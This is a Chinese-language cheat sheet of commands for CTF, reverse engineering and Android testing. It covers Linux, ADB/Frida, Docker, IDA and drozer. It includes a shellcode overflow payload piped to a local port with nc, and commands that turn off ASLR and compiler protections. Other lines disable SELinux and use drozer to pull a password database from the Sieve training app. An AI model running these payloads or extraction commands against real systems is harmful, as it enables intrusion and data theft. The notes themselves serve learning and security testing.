              <h1 id="Linux-Mac命令记录"><a href="#Linux-Mac命令记录" class="headerlink" title="Linux/Mac命令记录"></a>Linux/Mac命令记录</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo xxxxx &gt; xx.txt 会自动换行<br>echo -n xxxxx &gt; xx.txt 不会换行<br><br>sudo passwd root <span class="hljs-regexp">//</span>更改root密码<br><br><span class="hljs-regexp">//</span>链接<br>$ sudo rm -rf python<br>$ sudo ln -s <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3  /u</span>sr<span class="hljs-regexp">/bin/</span>python<br><span class="hljs-regexp">//</span>换内核程序<br>sudo apt-get install synaptic<br><span class="hljs-regexp">//</span>重启桌面<br>sudo <span class="hljs-regexp">/etc/i</span>nit.d/gdm restart<br><span class="hljs-regexp">//</span>关闭ASLR<br>echo <span class="hljs-number">0</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>randomize_va_space<br><br>NX：-z execstack <span class="hljs-regexp">/ -z noexecstack (关闭 /</span> 开启)    不让执行栈上的数据，于是JMP ESP就不能用了<br>Canary：-fno-stack-protector <span class="hljs-regexp">/-fstack-protector /</span> -fstack-protector-all (关闭 <span class="hljs-regexp">/ 开启 /</span> 全开启)  栈里插入cookie信息<br>PIE：-no-pie <span class="hljs-regexp">/ -pie (关闭 /</span> 开启)   地址随机化，另外打开后会有get_pc_thunk<br>RELRO：-z norelro <span class="hljs-regexp">/ -z lazy /</span> -z now (关闭 <span class="hljs-regexp">/ 部分开启 /</span> 完全开启)  对GOT表具有写权限<br>gcc -z execstack -fno-stack-protector -no-pie -z norelro<br><span class="hljs-regexp">//</span>linux命令，将指定程序在指定端口运行：<br>socat tcp-listen:<span class="hljs-number">10001</span>,reuseaddr,fork EXEC:./file_name,pty,raw,echo=<span class="hljs-number">0</span><br><br><span class="hljs-regexp">//</span>在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样）<br><br>特殊的gadgets:<br>通常位于x64的ELF程序中的__libc_csu_init,<br>universal_gadget1 = <span class="hljs-number">0</span>x40075a           <span class="hljs-comment">#万能gadget1：pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span><br>universal_gadget2 = <span class="hljs-number">0</span>x400740        <span class="hljs-comment">#万能gadget2：mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]</span><br><br>xattr -d -r com.apple.quarantine ./*<br><br>echo -e <span class="hljs-string">&quot;`perl -e &#x27;print &quot;</span>jhh<span class="hljs-regexp">//</span><span class="hljs-regexp">/sh/</span>bin\x89\xe3h\x01\x01\x01\x01\x814<span class="hljs-variable">$ri</span>\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1c\xd0\xff\xff<span class="hljs-string">&quot;&#x27;`&quot;</span> | nc <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1337</span> <br><br></code></pre></td></tr></table></figure>

<h1 id="ABD-frida-android命令"><a href="#ABD-frida-android命令" class="headerlink" title="ABD/frida/android命令"></a>ABD/frida/android命令</h1><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs tcl">adb tcpip <span class="hljs-number">5555</span><br>adb connect xxxxx:<span class="hljs-number">5555</span><br>强制运行<span class="hljs-number">32</span>位模式：adb install --abi armeabi-v7a xxxx.apk<br><br>cat /<span class="hljs-keyword">proc</span>/cpuinfo #Android查看cpu架构<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">adb</span> shell<span class="hljs-title"> am</span> start -D -n<span class="hljs-title"> com.iscclockk/.MainActivity</span><br>jdb附加<span class="hljs-title"> jdb</span> -connect<span class="hljs-title"> com.sun.jdi.SocketAttach:hostname=localhost,port=8700</span><br><span class="hljs-title"></span><br><span class="hljs-title">setenforce</span> 0<br>设置全局调试：<span class="hljs-title"></span><br><span class="hljs-title">magisk</span> resetprop<span class="hljs-title"> ro.debuggable</span> 1<span class="hljs-title"></span><br><span class="hljs-title">stop;start;</span><br><span class="hljs-title"></span><br><span class="hljs-title">frida非标准端口连接:</span><br>	./frida-server -l 0.0.0.0:6666<span class="hljs-title"></span><br><span class="hljs-title">	frida-ps</span> -H 192.168.1.102:6666<span class="hljs-title"></span><br><span class="hljs-title">	objection</span> -p 6666<br>以调试模式启动：<span class="hljs-title"></span><br><span class="hljs-title">adb</span> shell<span class="hljs-title"> am</span> set-debug-app -w<span class="hljs-title"> com.d3ctf.noname</span><br>查看android是32还是64：<span class="hljs-title"></span><br><span class="hljs-title">adb</span> shell<span class="hljs-title"> getprop</span> ro.product.cpu.abi<br>查看app最前台进程：<span class="hljs-title"></span><br><span class="hljs-title">adb</span> shell<span class="hljs-title"> dumpsys</span> window |<span class="hljs-title"> grep</span> mCurrentFocus<span class="hljs-title"></span><br><span class="hljs-title">frida</span> -U -f<span class="hljs-title"> cn.ticktick.task</span> -l 202012lesson6.js --no-pause<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">mobsf：docker</span> run -it -p 8000:8000<span class="hljs-title"> opensecurity/mobile-security-framework-mobsf:latest</span><br></code></pre></td></tr></table></figure>

<h1 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>导入镜像：docker import - ubuntu/<span class="hljs-number">17.04</span>.amd64<br><span class="hljs-regexp">//</span>运行镜像：docker run -it -p <span class="hljs-number">23946</span>:<span class="hljs-number">23946</span> ubuntu<span class="hljs-regexp">/17.04.amd64 /</span>bin/bash<br>  会创建一个docker容器，第一个端口是宿主机的端口，第二个是容器的端口<br><span class="hljs-regexp">//</span>列出容器：docker container ls -a<br><span class="hljs-regexp">//</span>容器重命名：docker container rename old_name new_name<br><span class="hljs-regexp">//</span>打开容器的shell：docker exec -it container_name <span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-regexp">//</span>启动容器：docker start container_name<br><span class="hljs-regexp">//</span>复制：docker container cp file_name container_name:/root<br><br><span class="hljs-regexp">//</span>导入镜像<br>docker load -i nginx.tar<br><span class="hljs-regexp">//</span>导出镜像<br>docker save -o nginx.tar nginx:latest<br></code></pre></td></tr></table></figure>

<h1 id="IDA常用"><a href="#IDA常用" class="headerlink" title="IDA常用"></a>IDA常用</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sub_</span> 指令和子函数起点<br><span class="hljs-attribute">locret_</span> 返回指令 <br><span class="hljs-attribute">loc_</span> 指令<br><span class="hljs-attribute">off_</span> 数据，包含偏移量<br><span class="hljs-attribute">seg_</span> 数据，包含段地址值<br><span class="hljs-attribute">asc_</span> 数据，ASCII字符串<br><span class="hljs-attribute">byte_</span> 数据，字节（或字节数组）<br><span class="hljs-attribute">word_</span> 数据，<span class="hljs-number">16</span>位数据（或字数组）<br><span class="hljs-attribute">dword_</span> 数据，<span class="hljs-number">32</span>位数据（或双字数组）<br><span class="hljs-attribute">qword_</span> 数据，<span class="hljs-number">64</span>位数据（或<span class="hljs-number">4</span>字数组）<br><span class="hljs-attribute">flt_</span> 浮点数据，<span class="hljs-number">32</span>位（或浮点数组）<br><span class="hljs-attribute">dbl_</span> 浮点数，<span class="hljs-number">64</span>位（或双精度数组）<br><span class="hljs-attribute">tbyte_</span> 浮点数，<span class="hljs-number">80</span>位（或扩展精度浮点数）<br><span class="hljs-attribute">stru_</span> 结构体(或结构体数组)<br><span class="hljs-attribute">algn_</span> 对齐指示<br><span class="hljs-attribute">unk_</span> 未处理字节<br></code></pre></td></tr></table></figure>



<h1 id="drozer命令"><a href="#drozer命令" class="headerlink" title="drozer命令"></a>drozer命令</h1><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta">&gt;</span> <span class="javascript">list  <span class="hljs-comment">//列出目前可用的模块，也可以使用ls</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">help app.activity.forintent       <span class="hljs-comment">//查看指定模块的帮助信息</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.package.list      <span class="hljs-comment">//列出android设备中安装的app</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.package.info -a com.android.browser       <span class="hljs-comment">//查看指定app的基本信息</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.activity.info -a com.android.browser      <span class="hljs-comment">//列出app中的activity组件</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.activity.start --action android.intent.action.VIEW --data-uri  http:<span class="hljs-comment">//www.google.com  //开启一个activity，例如运行浏览器打开谷歌页面</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run scanner.provider.finduris -a com.sina.weibo       <span class="hljs-comment">//查找可以读取的Content Provider</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run  app.provider.query content:<span class="hljs-comment">//settings/secure --selection &quot;name=&#x27;adb_enabled&#x27;&quot;    //读取指定Content Provider内容</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run scanner.misc.writablefiles --privileged /data/data/com.sina.weibo     <span class="hljs-comment">//列出指定文件路径里全局可写/可读的文件</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run shell.start       <span class="hljs-comment">//shell操作</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run tools.setup.busybox       <span class="hljs-comment">//安装busybox</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">list auxiliary        <span class="hljs-comment">//通过web的方式查看content provider组件的相关内容</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">help auxiliary.webcontentresolver     <span class="hljs-comment">//webcontentresolver帮助</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run auxiliary.webcontentresolver      <span class="hljs-comment">//执行在浏览器中以http://localhost:8080即可访问</span></span><br>以sieve示例<br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.package.list -f sieve         <span class="hljs-comment">//查找sieve应用程序</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.package.info -a com.mwr.example.sieve         <span class="hljs-comment">//显示app.package.info命令包的基本信息</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.package.attacksurface com.mwr.example.sieve   <span class="hljs-comment">//确定攻击面</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.activity.info -a com.mwr.example.sieve         <span class="hljs-comment">//获取activity信息</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     <span class="hljs-comment">//启动pwlist</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.provider.info -a com.mwr.example.sieve        <span class="hljs-comment">//提供商信息</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run scanner.provider.finduris -a com.mwr.example.sieve        <span class="hljs-comment">//扫描所有能访问地址 </span></span><br>&gt;run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/--vertical  //查看DBContentProvider/Passwords这条可执行地址<br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.provider.query content:<span class="hljs-comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;   //检测注入</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.provider.read content:<span class="hljs-comment">//com.mwr.example.sieve.FileBackupProvider/etc/hosts    //查看读权限数据</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.provider.download content:<span class="hljs-comment">//com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db //下载数据</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run scanner.provider.injection -a com.mwr.example.sieve       <span class="hljs-comment">//扫描注入地址</span></span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run scanner.provider.traversal -a com.mwr.example.sieve</span><br><span class="hljs-meta">&gt;</span> <span class="javascript">run app.service.info -a com.mwr.example.sieve         <span class="hljs-comment">//查看服务</span></span><br></code></pre></td></tr></table></figure>
